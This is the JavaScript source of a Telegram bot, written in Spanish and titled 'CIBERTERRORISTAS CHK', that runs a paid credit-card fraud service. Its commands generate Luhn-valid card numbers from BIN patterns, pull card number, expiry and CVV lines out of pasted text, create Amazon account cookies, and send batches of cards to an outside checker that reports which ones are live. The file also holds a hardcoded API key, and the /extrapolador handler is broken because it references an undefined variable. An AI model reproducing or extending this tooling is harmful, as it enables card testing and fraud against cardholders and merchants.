// ============================================
// BOT DE TELEGRAM - CIBERTERRORISTAS CHK
// Versión final con comandos mejorados
// ============================================

const TelegramBot = require('node-telegram-bot-api');
const { pool } = require('./database');

// ========== CONFIGURACIÓN ==========
const token = process.env.TELEGRAM_BOT_TOKEN;
const INTERNAL_API_URL = process.env.INTERNAL_API_URL || 'http://basedatos:8080/api';
const BOT_API_KEY = process.env.BOT_API_KEY || 'AALOL23894238HWKEJSNFSDGF';
const API_GENCOOKIE_URL = process.env.API_GENCOOKIE_URL || 'https://p01--gencookie--7ppzd7xy487n.code.run';
const API_EXTRAPOLADOR_URL = process.env.API_EXTRAPOLADOR_URL || 'https://p01--extrapolador--7ppzd7xy487n.code.run';


// Función segura para enviar mensajes (evita crashes por parse_mode)
async function sendSafeMessage(chatId, text, options = {}) {
    try {
        return await bot.sendMessage(chatId, text, options);
    } catch (error) {
        console.error(`❌ Error enviando mensaje a ${chatId}:`, error.message);
        // Si falló por parse_mode, reintentar sin él
        if (options.parse_mode) {
            console.log(`Reintentando sin parse_mode...`);
            delete options.parse_mode;
            try {
                return await bot.sendMessage(chatId, text, options);
            } catch (err) {
                console.error(`❌ También falló sin parse_mode:`, err.message);
            }
        }
        return null;
    }



}


// Obtener el valor global de force_playwright
async function getGlobalForcePlaywright() {
    const res = await pool.query(
        `SELECT value FROM global_settings WHERE key = 'force_playwright'`
    );
    if (res.rows.length === 0) {
        // Valor por defecto: false (usar método rápido)
        await pool.query(
            `INSERT INTO global_settings (key, value) VALUES ('force_playwright', 'false')`
        );
        return false;
    }
    return res.rows[0].value === 'true';
}

// Establecer el valor global
async function setGlobalForcePlaywright(value) {
    await pool.query(
        `UPDATE global_settings SET value = $1 WHERE key = 'force_playwright'`,
        [value ? 'true' : 'false']
    );
}


if (!token) {
    console.error('❌ ERROR: TELEGRAM_BOT_TOKEN no configurado');
    process.exit(1);
}

const bot = new TelegramBot(token, { polling: true });
console.log('🤖 Bot de Telegram inicializado');

const GROUP_CHAT_ID = process.env.GROUP_CHAT_ID; // Ejemplo: -1001234567890
if (!GROUP_CHAT_ID) {
    console.warn('⚠️ GROUP_CHAT_ID no configurado. No se expulsará a nadie.');
}

// Mapa para rastrear usuarios en proceso de generación
const processingUsers = new Map();

async function kickUserFromGroup(telegramUserId) {
    if (!GROUP_CHAT_ID) return false;
    try {
        await bot.telegram.kickChatMember(GROUP_CHAT_ID, telegramUserId);
        console.log(`✅ Usuario ${telegramUserId} expulsado del grupo por créditos 0`);
        return true;
    } catch (error) {
        console.error(`❌ Error expulsando a ${telegramUserId}:`, error.description || error.message);
        return false;
    }
}

async function checkAndKickIfNoDaysOrCredits(telegramId, chatId, requiredCredits = 0) {
    const user = await getUserByTelegramId(telegramId);
    if (!user) {
        await sendSafeMessage(chatId, '❌ Usa /start primero.');
        return false;
    }
    if (user.days_remaining <= 0) {
        await kickUserFromGroup(telegramId);
        await sendSafeMessage(chatId, '❌ Tus días han expirado. Has sido expulsado del grupo. Contacta al admin para renovar.');
        return false;
    }
    if (requiredCredits > 0 && user.credits < requiredCredits) {
        await sendSafeMessage(chatId, `❌ Créditos insuficientes. Necesitas: (${requiredCredits}).`);
        return false;
    }
    return true;
}

// Función para limpiar el estado después de un tiempo (seguridad)
function scheduleCleanup(telegramId, timeoutMs = 300000) { // 5 minutos máximo
    setTimeout(() => {
        if (processingUsers.has(telegramId)) {
            console.log(`⚠️ Limpieza automática para usuario ${telegramId} después de timeout`);
            processingUsers.delete(telegramId);
        }
    }, timeoutMs);
}


// Función para obtener rol por telegram_id
async function getUserRoleByTelegramId(telegramId) {
    const res = await pool.query('SELECT role FROM users WHERE telegram_id = $1', [telegramId]);
    return res.rows[0]?.role;
}



bot.onText(/\/gencukilento/, async (msg) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;

    const role = await getUserRoleByTelegramId(telegramId);
    if (role !== 'admin') {
        return await sendSafeMessage(chatId, '❌ No tienes permiso para usar este comando. Solo administradores.');
    }

    const current = await getGlobalForcePlaywright();
    const newValue = !current;
    await setGlobalForcePlaywright(newValue);
    const status = newValue ? '✅ ACTIVADO (Forzar Playwright)' : '❌ DESACTIVADO (Método rápido)';
    await sendSafeMessage(chatId, `🐢 Modo lento: ${status}`);
});

bot.onText(/\/estatusCuki/, async (msg) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;

    // Verificar si el usuario es admin (por su rol en la BD)
    const role = await getUserRoleByTelegramId(telegramId);
    if (role !== 'admin') {
        return await sendSafeMessage(chatId, '❌ No tienes permiso para usar este comando. Solo administradores.');
    }

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 10000);
        const response = await fetch(`${INTERNAL_API_URL}/admin/bot/toggle-service`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'x-bot-key': BOT_API_KEY   // ← clave del bot
            },
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (data.success) {
            const status = data.enabled ? '✅ ACTIVADO' : '❌ DESACTIVADO';
            await sendSafeMessage(chatId, `Servicio de generación de cookies: ${status}`);
        } else {
            await sendSafeMessage(chatId, `Error: ${data.error}`);
        }
    } catch (error) {
        console.error('Error en /estatusCuki:', error);
        await sendSafeMessage(chatId, `Error: ${error.message}`);
    }
});


// ========== FUNCIONES PARA EXPORTAR ==========
async function sendVerificationCodeToUser(username, code) {
    try {
        const userResult = await pool.query(
            `SELECT id, telegram_chat_id FROM users WHERE username = $1`,
            [username.replace('@', '')]
        );
        if (userResult.rows.length === 0 || !userResult.rows[0].telegram_chat_id) {
            return { success: false, error: 'Usuario no encontrado o sin chat_id' };
        }
        await sendSafeMessage(
            userResult.rows[0].telegram_chat_id,
            `🔐 *Código de verificación:* ${code}\n⏰ Válido por 10 minutos.`,
            { parse_mode: 'Markdown' }
        );
        return { success: true };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

async function sendLiveToTelegram(chatId, mensaje) {
    try {
        await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });
        return { success: true };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

// ========== FUNCIONES AUXILIARES ==========
async function getUserByTelegramId(telegramId) {
    const res = await pool.query(
        'SELECT id, username, credits, days_remaining FROM users WHERE telegram_id = $1',
        [telegramId]
    );
    return res.rows[0];
}

async function upsertUser(telegramId, username, chatId, chatType) {
    if (chatType !== 'private') return; // Solo en chats privados

    const now = new Date();
    const client = await pool.connect();
    try {
        await client.query('BEGIN');

        // 1. Eliminar el chat_id de cualquier otro usuario (incluyendo posibles duplicados)
        await client.query(
            `UPDATE users SET telegram_chat_id = NULL WHERE telegram_chat_id = $1`,
            [chatId]
        );

        // 2. Buscar si el usuario ya existe por telegram_id
        const existing = await client.query(
            'SELECT id FROM users WHERE telegram_id = $1',
            [telegramId]
        );

        if (existing.rows.length > 0) {
            // Actualizar el registro existente
            await client.query(
                `UPDATE users 
                 SET telegram_chat_id = $1, 
                     telegram_username = $2,
                     updated_at = $3
                 WHERE telegram_id = $4`,
                [chatId, username, now, telegramId]
            );
        } else {
            // Buscar por username (posiblemente se registró por web sin telegram)
            const byUsername = await client.query(
                'SELECT id FROM users WHERE username = $1',
                [username]
            );
            if (byUsername.rows.length > 0) {
                await client.query(
                    `UPDATE users 
                     SET telegram_id = $1,
                         telegram_chat_id = $2,
                         telegram_username = $3,
                         updated_at = $4
                     WHERE username = $5`,
                    [telegramId, chatId, username, now, username]
                );
            } else {
                // Crear nuevo usuario
                await client.query(
                    `INSERT INTO users 
                     (telegram_id, telegram_username, telegram_chat_id, username, created_at)
                     VALUES ($1, $2, $3, $4, $5)`,
                    [telegramId, username, chatId, username, now]
                );
            }
        }

        await client.query('COMMIT');
    } catch (error) {
        await client.query('ROLLBACK');
        console.error('Error en upsertUser:', error);
        // No relanzamos el error para que el bot no crashee
    } finally {
        client.release();
    }
}
async function deductCredits(telegramId, amount = 4) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 1500000);
        const response = await fetch(`${INTERNAL_API_URL}/user/bot/use-credits`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegram_id: telegramId, amount, bot_key: BOT_API_KEY }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        if (data.success) {
            return { newCredits: data.newCredits, creditsZero: data.credits_zero || false, role: data.role };
        } else {
            return null;
        }
    } catch (error) {
        console.error('Error en deductCredits:', error);
        return null;
    }
}
function limpiarTarjetas(textoSucio) {
    const textoLimpio = textoSucio
        .replace(/\u200b/g, '')
        .replace(/[\u2060\u200C\u200D\uFEFF]/g, '')
        .replace(/\s+/g, ' ')
        .replace(/\[ShadowChk\] CC Storage \| /g, '')
        .replace(/\[mastercard.*?\]/g, '')
        .replace(/\[.*?\]/g, '')
        .replace(/\(.*?\)/g, '')
        .trim();
    const patron = /(\d{16})\s*[|│]\s*(\d{2})\s*[|│]\s*(\d{4})\s*[|│]\s*(\d{3})/g;
    const tarjetas = [];
    let match;
    while ((match = patron.exec(textoLimpio)) !== null) {
        const [_, num, mes, año, cvv] = match;
        if (num.length === 16 && mes.length === 2 && año.length === 4 && cvv.length === 3) {
            tarjetas.push(`${num}|${mes}|${año}|${cvv}`);
        }
    }
    return [...new Set(tarjetas)];
}

async function verificarTarjetasAmazon(tarjetas, cookies) {
    const resultados = [];
    for (const card of tarjetas) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000000);
            const response = await fetch(`https://p01--amazonchk--vwr6mdxp7dhn.code.run/api/check-card`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ card, cookies }),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await response.json();
            resultados.push({ card, status: data.status, message: data.message });
        } catch (error) {
            resultados.push({ card, status: 'ERROR', message: error.message });
        }
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    return resultados;
}

function calcularDigitoLuhn(numeroParcial) {
    let suma = 0;
    let esPar = true;
    for (let i = numeroParcial.length - 1; i >= 0; i--) {
        let digito = parseInt(numeroParcial[i]);
        if (esPar) {
            digito *= 2;
            if (digito > 9) digito -= 9;
        }
        suma += digito;
        esPar = !esPar;
    }
    return (10 - (suma % 10)) % 10;
}

async function incrementCookieCountBot(telegramId) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000);
        const response = await fetch(`${INTERNAL_API_URL}/user/bot/increment-cookie-count`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ telegram_id: telegramId, bot_key: BOT_API_KEY }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        const data = await response.json();
        return data.success;
    } catch (error) {
        console.error('Error incrementando cookie count (bot):', error);
        return false;
    }
}

// ========== COMANDOS ==========

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const from = msg.from;
    const telegramId = from.id;
    const username = from.username || telegramId.toString();
    const firstName = from.first_name || '';
    const chatType = msg.chat.type;

    try {
        const existing = await getUserByTelegramId(telegramId);
        const isNew = !existing;
        await upsertUser(telegramId, username, chatId, chatType);
        if (isNew) {
            const mensaje = 
                `👋 ¡Hola ${firstName}! 👋 \n\n` +
                `He guardado tu Chat ID: <code>${telegramId}</code>\n\n` +
                `Ahora puedes registrarte en la web (y obtener una cookie gratis) siguiendo estos pasos:\n\n` +
                `1. Ve a la página:\n\n` +
                `                 ꧁⎝ 𓆩༺✧༻𓆪 ⎠꧂\n` +
                `https://astralchk.com/login.html\n` +
                `                 ꧁⎝ 𓆩༺✧༻𓆪 ⎠꧂ \n\n` +
                `2. Usa tu usuario: @${username}\n\n` +
                `3. Recibirás un código de verificación aquí. \n\n` +
                `4. Escríbelo en la página web, obtén una cookie gratis y comienza a livear y shippear ahora. \n\n` +
                `                 👾 ¡Te esperamos! 👾`;
            await sendSafeMessage(chatId, mensaje, { parse_mode: 'HTML' });
        } else {
            const servicios = 
                `*Servicios activos:*\n` +
                `• Amazon (/chk amazon + tarjetas)\n` +
                `• Generador de cookies (/gencookie MX ✅)\n` +
                `• Extrapolador (/extrapolador 557910) ✅\n` +
                `• Generador de tarjetas (/gen 557910574828xxxx|12|2028|000) ✅\n` +
                `• Limpiador de texto (/limpiador texto) ✅\n`;
            const mensaje = 
                `👋 ¡Hola ${firstName}!\n\n` +
                `💰 *Créditos:* ${existing.credits}\n` +
                `📅 *Días restantes:* ${existing.days_remaining}\n\n` +
                `${servicios}\n` +
                `Usa /menu para ver todos los comandos.`;
            await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });
        }
    } catch (error) {
        console.error('Error en /start:', error);
        await sendSafeMessage(chatId, '❌ Error interno.');
    }
});

// /gencookie - permite país en el comando o interactivo
bot.onText(/^\/gencookie(?:\s+(\w+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;

    // Bloquear si ya tiene una generación activa
    if (processingUsers.has(telegramId)) {
        return await sendSafeMessage(chatId, '⏳ Ya tienes una generación de cookie en curso. Espera a que termine antes de iniciar otra.');
    }

    // Marcar como en proceso
    processingUsers.set(telegramId, Date.now());
    scheduleCleanup(telegramId);

    try {

        let country = match[1] ? match[1].toUpperCase() : null;
        if (!country) {
            await sendSafeMessage(chatId, '🌎 ¿Para qué país deseas generar la cookie? (MX, US, CA, UK, DE, FR, IT, ES, JP, AU, IN)');
            const response = await new Promise(resolve => {
                const listener = (resp) => {
                    if (resp.chat.id === chatId && resp.text && !resp.text.startsWith('/')) {
                        bot.removeListener('message', listener);
                        resolve(resp.text.trim().toUpperCase());
                    }
                };
                bot.on('message', listener);
                setTimeout(() => resolve(null), 60000);
            });
            if (!response) return await sendSafeMessage(chatId, '❌ No se ha recibido ningún país para generar la cookieg. Vuelve a intentar.');
            country = response;
        }
        if (!['MX','US','CA','UK','DE','FR','IT','ES','JP','AU','IN'].includes(country)) {
            return await sendSafeMessage(chatId, `❌ País inválido. Usa: MX, US, CA, UK, DE, FR, IT, ES, JP, AU, IN`);
        }
        const user = await getUserByTelegramId(telegramId);
        if (!user) return await sendSafeMessage(chatId, '❌ Usa /start primero.');
        if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 4)) return;
        await sendSafeMessage(chatId, `🔄 Generando cookie para ${country}... (puede tardar hasta 5 min)`);
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000000);
            // Obtener el estado global forzado por el administrador
            const globalForcePlaywright = await getGlobalForcePlaywright();

            // Construir el body con o sin force_playwright
            const requestBody = { country, add_address: true };
            if (globalForcePlaywright) {
                requestBody.force_playwright = true;
            }

            const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(requestBody),
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            const textResponse = await response.text();
            if (!response.ok) throw new Error(`HTTP ${response.status}: ${textResponse.substring(0,100)}`);
            let data;
            try { data = JSON.parse(textResponse); } catch(e) { throw new Error('Respuesta no es JSON'); }
            if (!data.success || !data.data) throw new Error(data.error || 'Error del generador');
            const { phone, password, cookie_string, country: ctry } = data.data;
        let creditResult = null;
        try {
            creditResult = await deductCredits(telegramId, 4);
            if (creditResult === null) throw new Error('Fallo en descuento');
            if (creditResult.creditsZero) {
                await kickUserFromGroup(telegramId);
                await sendSafeMessage(chatId, '⚠️ Has llegado a 0 créditos. Has sido expulsado del grupo VIP y se ha bloqueado tu acceso a la web y bot. Contacta al admin para recargar créditos.');
            }
            await incrementCookieCountBot(telegramId);
        } catch(creditError) { console.error('Error descontando créditos:', creditError); }

            let msgText = `🍪 *Cookie ${ctry}*\n📞 Teléfono: \`${phone}\`\n🔑 Pass: \`${password}\`\n🍪 Cookie:\n\`\`\`\n${cookie_string}\n\`\`\``;
            msgText += (creditResult !== null) ? `\n💰 Créditos restantes: ${creditResult.newCredits}` : `\n⚠️ No se pudieron actualizar tus créditos, pero la cookie es válida.`;
            await sendSafeMessage(chatId, msgText, { parse_mode: 'Markdown' });
            
        } catch(error) {
            console.error(error);
            await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
        }

        if (user.credits < 4) {
            processingUsers.delete(telegramId);
            return await sendSafeMessage(chatId, '❌ Créditos insuficientes (4).');
        }

    } catch (error) {
        console.error('Error en /gencookie:', error);
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    } finally {
        // Liberar siempre al finalizar (éxito o error)
        processingUsers.delete(telegramId);
    }
});


// Comando /web - Muestra el enlace a la página web
bot.onText(/\/web/, async (msg) => {
    const chatId = msg.chat.id;
    await sendSafeMessage(
        chatId,
        `🌐 *Accede a nuestra web oficial:*\n\n🔗 https://astralchk.com/\n\nDesde allí puedes gestionar tus lives, cuentas y más.`,
        { parse_mode: 'Markdown', disable_web_page_preview: true }
    );
});

// Comando /bot - Muestra el enlace al nuevo bot
bot.onText(/\/bot/, async (msg) => {
    const chatId = msg.chat.id;
    await sendSafeMessage(
        chatId,
        `🤖 *Nuestro nuevo bot oficial:*\n\n👉 @AstralCHK_Bot\n\nÚsalo para generar cookies, verificar tarjetas y más. No olvides enviar /start.`,
        { parse_mode: 'Markdown', disable_web_page_preview: true }
    );
});


// /extrapolador - permite BIN en el comando o interactivo
bot.onText(/\/extrapolador(?:\s+(\d{6}))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 10)) return;

    let bin = match[1];
    if (!bin) {
        await sendSafeMessage(chatId, '🔢 Por favor, ingresa el BIN de 6 dígitos para extrapolar:');
        const response = await new Promise(resolve => {
            const listener = (resp) => {
                if (resp.chat.id === chatId && resp.text && !resp.text.startsWith('/')) {
                    bot.removeListener('message', listener);
                    resolve(resp.text.trim());
                }
            };
            bot.on('message', listener);
            setTimeout(() => resolve(null), 60000);
        });
        if (!response) return await sendSafeMessage(chatId, '❌ No se ha recibido ningún BIN para extrapolar. Vuelve a intentarlo.');
        bin = response;
    }
    if (!/^\d{6}$/.test(bin)) return await sendSafeMessage(chatId, '❌ BIN inválido. Debe tener 6 dígitos.');
    await sendSafeMessage(chatId, `🔍 Extrapolando para BIN ${bin}...`);
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000000);
        // Obtener el estado global forzado por el administrador
        const globalForcePlaywright = await getGlobalForcePlaywright();

        // Construir el body con o sin force_playwright
        const requestBody = { country, add_address: true };
        if (globalForcePlaywright) {
            requestBody.force_playwright = true;
        }

        const response = await fetch(`${API_GENCOOKIE_URL}/generate`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(requestBody),
            signal: controller.signal
        });
        clearTimeout(timeoutId);
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        if (!data.success || !data.data || data.data.length === 0) {
            return await sendSafeMessage(chatId, `❌ No se encontraron tarjetas para BIN ${bin}.`);
        }
        const patrones = {};
        for (const tarjeta of data.data) {
            const partes = tarjeta.split('|');
            if (partes.length < 3) continue;
            const numero = partes[0];
            const mes = partes[1];
            const año = partes[2];
            if (numero.length !== 16) continue;
            const prefix = numero.slice(0,12);
            const clave = `${prefix}xxxx|${mes}|${año}`;
            patrones[clave] = (patrones[clave] || 0) + 1;
        }
        if (Object.keys(patrones).length === 0) return await sendSafeMessage(chatId, '❌ No se pudieron extraer patrones.');
        const muy = [], mod = [], uni = [];
        for (const [patron, count] of Object.entries(patrones)) {
            if (count >= 3) muy.push({ patron, count });
            else if (count === 2) mod.push({ patron, count });
            else uni.push({ patron, count });
        }
        muy.sort((a,b)=>b.count-a.count);
        mod.sort((a,b)=>b.count-a.count);
        uni.sort((a,b)=>b.count-a.count);
        let mensaje = `=== EXTRAPOLADOR - RESULTADOS ===\n\n`;
        if (muy.length) {
            mensaje += `🟢 PATRONES MUY REPETIDOS (${muy.length}):\n==================================================\n`;
            for (const p of muy.slice(0,15)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} veces)\n`;
            }
            if (muy.length>15) mensaje += `... y ${muy.length-15} más.\n`;
            mensaje += `\n`;
        }
        if (mod.length) {
            mensaje += `🟡 PATRONES MODERADOS (${mod.length}):\n==================================================\n`;
            for (const p of mod.slice(0,15)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} veces)\n`;
            }
            if (mod.length>15) mensaje += `... y ${mod.length-15} más.\n`;
            mensaje += `\n`;
        }
        if (uni.length) {
            mensaje += `🔴 PATRONES ÚNICOS (${uni.length}):\n==================================================\n`;
            for (const p of uni.slice(0,20)) {
                const [prefix, mes, año] = p.patron.split('|');
                mensaje += `${prefix} | ${mes}/${año} | (${p.count} vez)\n`;
            }
            if (uni.length>20) mensaje += `... y ${uni.length-20} más.\n`;
        }
        if (mensaje.length > 4090) mensaje = mensaje.substring(0,4000) + "\n... (truncado)";
        await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });
        let creditResult = null;
        try {
            creditResult = await deductCredits(telegramId, 4);
            if (creditResult === null) throw new Error('Fallo en descuento');
            if (creditResult.creditsZero) {
                await kickUserFromGroup(telegramId);
                await sendSafeMessage(chatId, '⚠️ Has llegado a 0 créditos. Has sido expulsado del grupo. Contacta al admin para recargar.');
            }
            await incrementCookieCountBot(telegramId);
        } catch(creditError) { console.error('Error descontando créditos:', creditError); }
    } catch(error) {
        console.error(error);
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// ========== COMANDO /gen (sin argumentos) – modo interactivo ==========
bot.onText(/^\/gen$/, async (msg) => {
    const chatId = msg.chat.id;
    await sendSafeMessage(chatId, '🎴 Ingresa el patrón de la tarjeta (ej: 549949056298xxxx|05|2029) y opcionalmente la cantidad:');
    const response = await new Promise(resolve => {
        const listener = (resp) => {
            if (resp.chat.id === chatId && resp.text && !resp.text.startsWith('/')) {
                bot.removeListener('message', listener);
                resolve(resp.text.trim());
            }
        };
        bot.on('message', listener);
        setTimeout(() => resolve(null), 60000);
    });
        if (!response) return await sendSafeMessage(chatId, '❌ No se ha recibido ningún extra para generar tarjetas. Vuelve a intentarlo.');
    const parts = response.split(' ');
    let patron = parts[0];
    let cantidad = parts[1] && !isNaN(parseInt(parts[1])) ? parseInt(parts[1]) : 10;
    if (cantidad > 50) cantidad = 50;
    await generarTarjetas(chatId, patron, cantidad);
});

// ========== COMANDO /gen con argumentos (patrón y opcional cantidad) ==========
bot.onText(/^\/gen\s+([0-9X]+\|\d{2}\|\d{2,4})(?:\s+(\d+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    let patron = match[1];
    let cantidad = match[2] ? parseInt(match[2]) : 10;
    if (cantidad > 50) cantidad = 50;
    await generarTarjetas(chatId, patron, cantidad);
});

// Función auxiliar para generar tarjetas (evita duplicar código)
async function generarTarjetas(chatId, patron, cantidad) {
    try {
        const partes = patron.split('|');
        let [numBase, mes, año] = partes;
        const cvv = partes[3] || 'rnd';
        mes = mes.padStart(2, '0');
        año = año.length === 2 ? `20${año}` : año;
        if (numBase.length !== 16 || !/^[0-9X]+$/.test(numBase)) {
            throw new Error('El patrón del número debe tener 16 caracteres (dígitos o X)');
        }
        const tarjetas = [];
        for (let i = 0; i < cantidad; i++) {
            let numeroConX = '';
            for (let char of numBase) {
                if (char === 'X') {
                    numeroConX += Math.floor(Math.random() * 10).toString();
                } else {
                    numeroConX += char;
                }
            }
            const primeros15 = numeroConX.slice(0, 15);
            const digitoControl = calcularDigitoLuhn(primeros15);
            const numeroCompleto = primeros15 + digitoControl.toString();
            const cvvGen = cvv === 'rnd' ? Math.floor(100 + Math.random() * 900).toString() : cvv;
            tarjetas.push(`${numeroCompleto}|${mes}|${año}|${cvvGen}`);
        }
        const lista = tarjetas.slice(0, 20).map(t => `\`${t}\``).join('\n');
        const resto = tarjetas.length > 20 ? `\n... y ${tarjetas.length - 20} más` : '';
        await sendSafeMessage(chatId, `🎴 *Tarjetas generadas (${tarjetas.length}):*\n${lista}${resto}`, { parse_mode: 'Markdown' });
    } catch (error) {
        await sendSafeMessage(chatId, `❌ Error: ${error.message}`);
    }
}



// /limpiador - permite texto sucio en el comando o interactivo, resultado sin índices
bot.onText(/\/limpiador(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    let texto = match ? match[1] : null;
    if (!texto) {
        await sendSafeMessage(chatId, '📝 Envía el texto sucio con las tarjetas:');
        const response = await new Promise(resolve => {
            const listener = (resp) => {
                if (resp.chat.id === chatId && resp.text && !resp.text.startsWith('/')) {
                    bot.removeListener('message', listener);
                    resolve(resp.text);
                }
            };
            bot.on('message', listener);
            setTimeout(() => resolve(null), 60000);
        });
        if (!response) return await sendSafeMessage(chatId, '❌ No se ha recibido ningún texto sucio para limpiar. Vuelve a intentarlo.');
        texto = response;
    }
    const tarjetas = limpiarTarjetas(texto);
    if (tarjetas.length === 0) {
        await sendSafeMessage(chatId, '❌ No se encontraron tarjetas válidas en el texto.');
    } else {
        const lista = tarjetas.slice(0, 30).map(t => `\`${t}\``).join('\n');
        const resto = tarjetas.length > 30 ? `\n... y ${tarjetas.length - 30} más` : '';
        await sendSafeMessage(chatId, `🔍 *Tarjetas encontradas (${tarjetas.length}):*\n${lista}${resto}`, { parse_mode: 'Markdown' });
    }
});

// /amazon - primero pide la cookie, luego las tarjetas (orden inverso)
bot.onText(/\/amazon(?:\s+(.+))?/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    // Verificar créditos primero
    const user = await getUserByTelegramId(telegramId);
    if (!user) return await sendSafeMessage(chatId, '❌ Usa /start primero.');
    if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 0)) return;
    // Pedir cookie
    await sendSafeMessage(chatId, '🔑 Por favor, envía la cookie de Amazon (puedes obtenerla con /gencookie).');
    const cookieResp = await new Promise(resolve => {
        const listener = (resp) => {
            if (resp.chat.id === chatId && resp.text && !resp.text.startsWith('/')) {
                bot.removeListener('message', listener);
                resolve(resp.text.trim());
            }
        };
        bot.on('message', listener);
        setTimeout(() => resolve(null), 60000);
    });
    if (!cookieResp) return await sendSafeMessage(chatId, '❌ No se ha recibido ninguna cookie para checar tarjetas en Amazon. Vuelve a intentarlo.');
    const cookies = cookieResp;
    // Pedir tarjetas
    await sendSafeMessage(chatId, '💳 Ahora envía las tarjetas (pueden estar en texto sucio):');
    const cardsResp = await new Promise(resolve => {
        const listener = async (resp) => {
            if (resp.chat.id === chatId && resp.text && !resp.text.startsWith('/')) {
                bot.removeListener('message', listener);
                resolve(resp.text);
            }
        };
        bot.on('message', listener);
        setTimeout(() => resolve(null), 60000);
    });
    if (!cardsResp) return await sendSafeMessage(chatId, '❌ No se ha recibido ninguna tarjeta para checar en Amazon. Vuelve a intentarlo.');
    const rawText = cardsResp;
    const tarjetas = limpiarTarjetas(rawText);
    if (tarjetas.length === 0) return await sendSafeMessage(chatId, '❌ No se encontraron tarjetas válidas.');
    if (tarjetas.length > 20) return await sendSafeMessage(chatId, `⚠️ Máximo 20 tarjetas (tienes ${tarjetas.length}).`);
   
    await sendSafeMessage(chatId, `🔍 Verificando ${tarjetas.length} tarjetas...`);
    const resultados = await verificarTarjetasAmazon(tarjetas, cookies);
    let resumen = `📊 *Resultados*\n\n`;
    for (const r of resultados) {
        const emoji = r.status === 'LIVE' ? '✅' : (r.status === 'DEAD' ? '❌' : '⚠️');
        resumen += `${emoji} \`${r.card}\` → ${r.status}\n${r.message ? `   ${r.message}\n` : ''}`;
    }
    await sendSafeMessage(chatId, resumen, { parse_mode: 'Markdown' });
});

bot.onText(/\/creditos|\/credits|\/saldo|\/dias/, async (msg) => {
    const chatId = msg.chat.id;
    const telegramId = msg.from.id;
    const user = await getUserByTelegramId(telegramId);
    if (!user) return await sendSafeMessage(chatId, '❌ Usa /start primero.');
    await sendSafeMessage(chatId, `💰 *Créditos:* ${user.credits}\n📅 *Días:* ${user.days_remaining}`, { parse_mode: 'Markdown' });
});

bot.onText(/\/renovar/, async (msg) => {
    const chatId = msg.chat.id;
    await sendSafeMessage(chatId, `🔄 *Renovación*\nContacta a [@AstralCHK_Bot](https://t.me/AstralCHK_Bot)`, { parse_mode: 'Markdown', disable_web_page_preview: true });
});

bot.onText(/\/id/, async (msg) => {
    await sendSafeMessage(msg.chat.id, `📋 *Tu ID:* \`${msg.from.id}\``, { parse_mode: 'Markdown' });
});

bot.onText(/\/help/, async (msg) => {
    await sendSafeMessage(msg.chat.id,
        `📖 *Comandos:*\n` +
        `/start - Vincular cuenta\n` +
        `/gencookie MX (o US,CA...) - Generar cookie (4 créditos)\n` +
        `/gen 549949056298xxxx|05|2029 [cantidad] - Generar tarjetas\n` +
        `/limpiador - Extraer tarjetas de texto sucio\n` +
        `/extrapolador 557910 - Buscar por BIN (10 créditos)\n` +
        `/chk amazon - Verificar tarjetas (1 crédito, pide cookie y tarjetas)\n` +
        `/creditos - Ver saldo\n` +
        `/renovar - Contactar soporte\n` +
        `/id - Ver ID\n` +
        `/help - Esta ayuda`, { parse_mode: 'Markdown' });
});

bot.onText(/\/menu/, async (msg) => {
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: '🍪 Generar Cookie', callback_data: 'menu_gencookie' }],
                [{ text: '🔍 Extrapolador', callback_data: 'menu_extrapolador' }],
                [{ text: '🎴 Generar Tarjetas', callback_data: 'menu_gen' }],
                [{ text: '🧹 Limpiador', callback_data: 'menu_limpiador' }],
                [{ text: '🔍 Verificar Amazon', callback_data: 'menu_chk' }],
